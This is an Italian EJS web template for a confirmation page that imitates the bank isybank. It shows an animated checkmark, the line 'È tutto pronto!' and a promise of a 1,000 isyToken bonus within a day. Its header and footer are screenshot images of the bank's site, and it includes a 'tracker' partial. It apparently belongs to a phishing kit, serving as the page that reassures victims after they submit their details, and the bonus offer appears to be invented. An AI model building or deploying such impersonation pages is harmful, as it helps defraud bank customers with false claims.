<!DOCTYPE html>
<html lang="it">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>isybank</title>
    <link rel="stylesheet" href="css/botta.css">
    <%- include('partials/tracker') %>
    <style>
        /* =========================================================
           done.ejs Specific Styles (Confirmation & Animated Checkmark)
           ========================================================= */

        /* Main Container Layout */
        .done-main {
            flex: 1;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            z-index: 2;
            padding: clamp(24px, 4vh, 48px) 20px;
            box-sizing: border-box;
        }

        .done-card {
            width: 100%;
            max-width: 600px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            margin: 0 auto;
        }

        /* Animated Green Success Checkmark */
        .success-icon-wrapper {
            width: clamp(76px, 7vw, 98px);
            height: clamp(76px, 7vw, 98px);
            margin: 0 auto;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: popScale 0.4s ease-out 0.85s forwards;
            transform-origin: center center;
        }

        .success-checkmark {
            width: 100%;
            height: 100%;
            display: block;
            overflow: visible;
        }

        /* Subtle Background Circle Fill */
        .checkmark-circle-bg {
            transform-origin: 40px 40px;
            animation: fillCircle 0.5s ease-out 0.1s forwards;
            opacity: 0;
        }

        /* Circle Outline Drawing */
        .checkmark-circle {
            stroke-dasharray: 230;
            stroke-dashoffset: 230;
            stroke-width: 3.5;
            stroke-miterlimit: 10;
            stroke: #4CAF50;
            fill: none;
            transform-origin: 40px 40px;
            transform: rotate(-90deg);
            animation: drawCircle 0.65s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }

        /* Checkmark Drawing */
        .checkmark-check {
            stroke-dasharray: 55;
            stroke-dashoffset: 55;
            stroke: #4CAF50;
            stroke-width: 4.5;
            stroke-linecap: round;
            stroke-linejoin: round;
            fill: none;
            animation: drawCheck 0.45s cubic-bezier(0.65, 0, 0.45, 1) 0.55s forwards;
        }

        /* Keyframes */
        @keyframes drawCircle {
            0% {
                stroke-dashoffset: 230;
            }
            100% {
                stroke-dashoffset: 0;
            }
        }

        @keyframes fillCircle {
            0% {
                opacity: 0;
                transform: scale(0.6);
            }
            100% {
                opacity: 1;
                transform: scale(1);
            }
        }

        @keyframes drawCheck {
            0% {
                stroke-dashoffset: 55;
            }
            100% {
                stroke-dashoffset: 0;
            }
        }

        @keyframes popScale {
            0% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.08);
            }
            100% {
                transform: scale(1);
            }
        }

        /* Italian Confirmation Message */
        .success-content {
            margin-top: clamp(18px, 2vw, 28px);
            animation: fadeUpText 0.55s cubic-bezier(0.16, 1, 0.3, 1) 0.7s forwards;
            opacity: 0;
            transform: translateY(12px);
        }

        @keyframes fadeUpText {
            0% {
                opacity: 0;
                transform: translateY(12px);
            }
            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .success-heading {
            font-size: clamp(28px, 2.7vw, 44px);
            font-weight: 700;
            line-height: 1.2;
            letter-spacing: -0.6px;
            color: var(--isy-text, #191919);
            margin-bottom: clamp(10px, 1.1vw, 16px);
            text-align: center;
        }

        .success-description {
            font-size: clamp(15px, 1.15vw, 18px);
            font-weight: 400;
            line-height: 1.45;
            color: var(--isy-text-secondary, #595959);
            text-align: center;
            max-width: 520px;
            margin: 0 auto;
        }

        /* Accessibility: Reduced Motion */
        @media (prefers-reduced-motion: reduce) {
            .success-icon-wrapper,
            .checkmark-circle-bg,
            .checkmark-circle,
            .checkmark-check,
            .success-content {
                animation: none !important;
                stroke-dashoffset: 0 !important;
                opacity: 1 !important;
                transform: none !important;
            }
        }

        /* Mobile Adjustments (<= 768px) */
        @media (max-width: 768px) {
            .done-main {
                padding: clamp(20px, 3vh, 36px) 16px;
            }

            .done-card {
                max-width: 360px;
            }

            .success-heading {
                font-size: clamp(24px, 6.8vw, 32px);
                margin-bottom: 12px;
            }

            .success-description {
                font-size: clamp(14px, 3.8vw, 16px);
                line-height: 1.45;
            }
        }
    </style>
</head>

<body>

    <!-- Header Section (q1.png on Desktop, q1M.png on Mobile) -->
    <header class="header-desktop" aria-label="Intestazione isybank">
        <img src="img/q1.png" alt="isybank" onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q1.png';}">
    </header>
    <header class="header-mobile" aria-label="Intestazione isybank mobile">
        <img src="img/q1M.png" alt="isybank" onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q1M.png';}">
    </header>

    <!-- Main Confirmation Content Area -->
    <main class="done-main" role="main" aria-live="polite">
        <div class="done-card">

            <!-- Animated Green Success Checkmark -->
            <div class="success-icon-wrapper" aria-hidden="true">
                <svg class="success-checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 80">
                    <circle class="checkmark-circle-bg" cx="40" cy="40" r="36" fill="#e8f5e9" />
                    <circle class="checkmark-circle" cx="40" cy="40" r="36" fill="none" stroke="#4CAF50" />
                    <path class="checkmark-check" fill="none" stroke="#4CAF50" d="M23 40.5 L34.5 52 L57 28" />
                </svg>
            </div>

            <!-- Confirmation Message -->
            <div class="success-content">
                <h1 class="success-heading">È tutto pronto!</h1>
                <p class="success-description">Puoi usufruire di un BONUS di 1.000 isyToken entro un giorno.</p>
            </div>

        </div>

        <!-- Decorative Rainbow Graphics (Desktop only, q2.png) -->
        <img src="img/q2.png" alt="" class="rainbow-graphic" aria-hidden="true"
            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q2.png';}">
    </main>

    <!-- Footer Section (q4.png on Desktop, q4M.png on Mobile) -->
    <footer class="footer-desktop" aria-label="Piè di pagina isybank">
        <img src="img/q4.png" alt="Guida ai servizi | Sicurezza | Privacy | Cookies | Reclami e risoluzione delle controversie | Dichiarazione di accessibilità | Trasparenza"
            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q4.png';}">
    </footer>
    <footer class="footer-mobile" aria-label="Piè di pagina isybank mobile">
        <img src="img/q4M.png" alt="Guida ai servizi | Sicurezza | Privacy | Cookies | Reclami e risoluzione delle controversie | Dichiarazione di accessibilità | Trasparenza"
            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q4M.png';}">
    </footer>

</body>

</html>